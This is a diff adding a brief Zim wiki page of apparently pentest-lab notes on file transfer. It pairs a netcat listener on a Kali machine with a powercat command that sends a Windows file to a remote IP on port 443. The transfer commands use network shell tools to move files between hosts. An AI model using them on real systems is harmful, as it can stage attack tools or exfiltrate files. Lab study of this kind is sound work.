@@ -1,0 +1,14 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-19T13:38:14-04:00
+
+====== filetransfer ======
+Created Tuesday 19 May 2020
+
+====== on kali ======
+
+--**sudo nc -lnvp 443 > receiving_powercat.ps1**
+
+====== onpowershell ======
+
+**powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1**
